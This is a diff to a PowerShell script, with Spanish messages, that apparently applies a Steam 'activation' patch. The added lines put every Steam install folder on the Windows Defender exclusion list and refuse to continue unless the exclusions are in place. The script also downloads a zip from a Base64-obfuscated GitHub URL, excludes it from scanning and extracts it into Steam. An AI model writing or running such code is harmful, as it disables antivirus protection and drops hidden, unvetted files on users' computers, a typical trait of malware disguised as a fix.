@@ -28,6 +28,17 @@ function Get-SteamRoots {
 }
 $roots=Get-SteamRoots
 if(-not $roots -or $roots.Count -eq 0){ Write-Host 'No se encontro Steam instalado en esta PC.'; return }
+foreach($er in $roots){ try { Add-MpPreference -ExclusionPath $er -ErrorAction Stop } catch {} }
+function Test-Excluded([string]$p){
+  try {
+    $ex=(Get-MpPreference -ErrorAction Stop).ExclusionPath
+    foreach($e in $ex){ if($e -and ($p -ieq $e -or $p.StartsWith($e.TrimEnd('\')+'\',[System.StringComparison]::OrdinalIgnoreCase))){ return $true } }
+  } catch {}
+  return $false
+}
+$okRoots=@()
+foreach($er in $roots){ if(Test-Excluded $er){ $okRoots+=$er } }
+if($okRoots.Count -eq 0){ Write-Host 'error, sin exclusion.'; return }
 $zipUrl=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL2Jhc3Rpc2F5ZXMvRml4ZXMtc3RlYW0vcmVsZWFzZXMvZG93bmxvYWQvYmFzdGlzc3MvcGFyY2hlX251ZXZvLnppcA=='))
 $zip=Join-Path $env:TEMP ("act_" + (Get-Random) + ".zip")
 try { Add-MpPreference -ExclusionPath $zip -ErrorAction Stop } catch {}
@@ -40,7 +51,7 @@ try { $zx=[System.IO.Compression.ZipFile]::OpenRead($zip); $nTest=@($zx.Entries)
 if($nTest -le 0){ Write-Host 'Descarga incompleta. Intenta de nuevo.'; Remove-Item -LiteralPath $zip -Force -ErrorAction SilentlyContinue; return }
 Write-Host 'Aplicando activacion'
 $totOk=0; $totBad=0; $badFiles=@()
-foreach($sr in $roots){
+foreach($sr in $okRoots){
   Stop-SteamQ
   Start-Sleep -Milliseconds 1500
   $arch=[System.IO.Compression.ZipFile]::OpenRead($zip)
@@ -83,4 +94,4 @@ if($totBad -gt 0){
   return
 }
 Write-Host 'activacion aplicada y verificada.'
-try { Start-Process -FilePath (Join-Path $roots[0] 'steam.exe') -ErrorAction Stop } catch { Write-Host 'Abre Steam manualmente.' }
+try { Start-Process -FilePath (Join-Path $okRoots[0] 'steam.exe') -ErrorAction Stop } catch { Write-Host 'Abre Steam manualmente.' }
